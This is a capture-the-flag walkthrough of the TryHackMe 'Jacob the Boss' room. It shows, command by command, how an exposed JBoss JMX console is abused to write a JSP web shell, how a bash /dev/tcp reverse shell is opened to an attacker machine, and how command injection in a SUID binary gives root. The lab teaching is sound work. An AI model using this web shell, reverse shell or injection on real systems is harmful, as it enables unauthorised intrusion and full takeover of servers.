# Jacob the Boss

Find a way in and learn a little more.

Room: https://tryhackme.com/room/jacobtheboss

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/jacobtheboss.md

Well, the flaw that makes up this box is the reproduction found in the production environment of a customer a while ago, the verification in season consisted of two steps, the last one within the environment, we hit it head-on and more than 15 machines were vulnerable that together with the development team we were able to correct and adapt.

*First of all, add the jacobtheboss.box address to your hosts file.

----------

## Overview

This box starts with a large number of open ports, but most of the interesting ones point back to the same thing: an exposed JBoss instance.

The intended path is:

```text
Recon
-> add jacobtheboss.box to /etc/hosts
-> identify exposed JBoss management interfaces
-> abuse DeploymentFileRepository to write a JSP web shell
-> get shell as jacob
-> find custom SUID binary /usr/bin/pingsys
-> command injection
-> root
```

---

## Nmap

I started with a full TCP scan:

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -oN nmap-sv-all.txt <target-ip>
```

Important results:

```text
22/tcp    open  ssh
80/tcp    open  http      Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)
1090/tcp  open  java-rmi
1098/tcp  open  java-rmi
1099/tcp  open  java-object
3306/tcp  open  mysql
3873/tcp  open  java-object
4444/tcp  open  java-rmi
4445/tcp  open  java-object
4446/tcp  open  java-object
8009/tcp  open  ajp13
8080/tcp  open  http      Apache Tomcat/Coyote JSP engine 1.1
8083/tcp  open  http      JBoss service httpd
```

The scan also leaked a hostname:

```text
jacobtheboss.box
```

So I added it to `/etc/hosts`:

```bash
echo "<target-ip> jacobtheboss.box" | sudo tee -a /etc/hosts
```

---

## Web Enumeration

Port 80 showed a simple blog:

```bash
curl -i http://jacobtheboss.box/
```

The page was powered by Dotclear:

```text
Powered by Dotclear
```

This was interesting, but the JBoss ports were much more suspicious.

Port 8080 showed the default JBoss page:

```bash
curl -i http://jacobtheboss.box:8080/
```

Important header:

```text
X-Powered-By: Servlet 2.5; JBoss-5.0/JBossWeb-2.1
```

The default page also linked to:

```text
/status
/jmx-console/
/web-console/
```

Testing them showed they were accessible without authentication:

```bash
curl -i http://jacobtheboss.box:8080/jmx-console/
curl -i http://jacobtheboss.box:8080/web-console/
curl -i http://jacobtheboss.box:8080/invoker/JMXInvokerServlet
```

The JMX console was open:

```text
HTTP/1.1 200 OK
JBoss JMX Management Console
```

---

## Finding the Vulnerable MBean

I searched the JMX MBeans for `MainDeployer` first:

```bash
curl -s "http://jacobtheboss.box:8080/jmx-console/HtmlAdaptor?action=displayMBeans" \
  | grep -i "MainDeployer"
```

This confirmed:

```text
jboss.system:service=MainDeployer
```

The remote WAR deployment route was flaky and returned JBoss 500 errors, so I moved to the more reliable JBoss 5 method: `DeploymentFileRepository`.

I searched for it:

```bash
curl -s "http://jacobtheboss.box:8080/jmx-console/HtmlAdaptor?action=displayMBeans" \
  | grep -i "DeploymentFileRepository"
```

Found:

```text
jboss.admin:service=DeploymentFileRepository
```

Then I inspected the MBean:

```bash
curl -s "http://jacobtheboss.box:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin%3Aservice%3DDeploymentFileRepository" \
  -o repo.html

grep -n -i -A80 -B10 "store" repo.html
```

The `store` operation was available at `methodIndex=6`.

Its arguments were:

```text
arg0 = folder
arg1 = filename
arg2 = extension
arg3 = content
arg4 = boolean
```

---

## Writing a JSP Web Shell

I created a simple JSP command shell payload:

```bash
PAYLOAD='<%@ page import="java.io.*" %><% String c=request.getParameter("cmd"); if(c!=null){ String[] cmd={"/bin/sh","-c",c}; Process p=Runtime.getRuntime().exec(cmd); InputStream in=p.getInputStream(); InputStream err=p.getErrorStream(); byte[] b=new byte[4096]; int l; out.println("<pre>"); while((l=in.read(b))!=-1){out.write(new String(b,0,l));} while((l=err.read(b))!=-1){out.write(new String(b,0,l));} out.println("</pre>"); } %>'
```

At first, writing to `jmx-console.war` completed successfully but the file was not reachable from the web path.

The working path was:

```text
console-mgr.sar/web-console.war
```

I wrote the JSP shell into that deployed web application:

```bash
curl -s -X POST "http://jacobtheboss.box:8080/jmx-console/HtmlAdaptor" \
  --data-urlencode "action=invokeOp" \
  --data-urlencode "name=jboss.admin:service=DeploymentFileRepository" \
  --data-urlencode "methodIndex=6" \
  --data-urlencode "arg0=console-mgr.sar/web-console.war" \
  --data-urlencode "arg1=shell" \
  --data-urlencode "arg2=.jsp" \
  --data-urlencode "arg3=$PAYLOAD" \
  --data-urlencode "arg4=False"
```

The response showed:

```text
Operation completed successfully without a return value!
```

Then I tested command execution:

```bash
curl "http://jacobtheboss.box:8080/web-console/shell.jsp?cmd=id"
```

Output:

```text
uid=1001(jacob) gid=1001(jacob) groups=1001(jacob)
```

That confirmed RCE as `jacob`.

---

## Getting a Reverse Shell

I started a listener:

```bash
nc -lvnp 4444
```

Then triggered a reverse shell through the JSP:

```bash
curl --get "http://jacobtheboss.box:8080/web-console/shell.jsp" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<attackbox-ip>/4444 0>&1'"
```

Caught shell:

```text
Connection received
bash: no job control in this shell
[jacob@jacobtheboss /]$
```

I upgraded the shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null || python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## User Flag

In Jacob's home directory:

```bash
cd ~
ls
cat user.txt
```

Flag:

```text
f4d491f280de360cc49e26ca1587c***
```

---

## Privilege Escalation Enumeration

I checked SUID binaries:

```bash
find / -perm -4000 -type f -printf '%u %g %m %p\n' 2>/dev/null
```

One custom binary stood out:

```text
root root 4755 /usr/bin/pingsys
```

This is not a normal default Linux SUID binary.

I inspected it:

```bash
file /usr/bin/pingsys
strings /usr/bin/pingsys | head -80
strings /usr/bin/pingsys | grep -iE "ping|system|exec|sh|bash|PATH|/bin|root"
```

Interesting strings:

```text
setuid
system
ping -c 4 %s
pingsys.c
```

The binary was using `system()` with user-controlled input placed into:

```text
ping -c 4 %s
```

Running it without arguments showed the bug clearly:

```bash
/usr/bin/pingsys
```

Output:

```text
sh: -c: line 0: syntax error near unexpected token `('
sh: -c: line 0: `ping -c 4 (null)'
```

So I tested command injection:

```bash
/usr/bin/pingsys '127.0.0.1; id'
```

Output showed root execution:

```text
uid=0(root) gid=1001(jacob) groups=1001(jacob)
```

---

## Root Shell

Since the binary runs commands as root, I used Bash preserve-privileges mode:

```bash
/usr/bin/pingsys '127.0.0.1; /bin/bash -p'
```

This dropped me into a root shell:

```text
[root@jacobtheboss home]# whoami
root
```

Then I grabbed the root flag:

```bash
cd /root
cat root.txt
```

Flag:

```text
29a5641eaa0c01abe5749608c8232***
```

---

## Summary

The box was vulnerable because JBoss management interfaces were exposed without authentication.

The initial foothold came from abusing:

```text
/jmx-console/
jboss.admin:service=DeploymentFileRepository
store()
```

The working write location was:

```text
console-mgr.sar/web-console.war
```

This allowed a JSP web shell to be written and executed at:

```text
/web-console/shell.jsp
```

Privilege escalation came from a custom SUID root binary:

```text
/usr/bin/pingsys
```

The binary passed user input into a shell command using `system()`:

```text
ping -c 4 %s
```

That allowed command injection and a root shell:

```bash
/usr/bin/pingsys '127.0.0.1; /bin/bash -p'
```

Final path:

```text
Nmap
-> add jacobtheboss.box to /etc/hosts
-> find exposed JBoss 5
-> access unauthenticated JMX console
-> use DeploymentFileRepository store()
-> write JSP shell into web-console.war
-> RCE as jacob
-> read user.txt
-> find SUID /usr/bin/pingsys
-> command injection
-> root shell
-> read root.txt
```
 
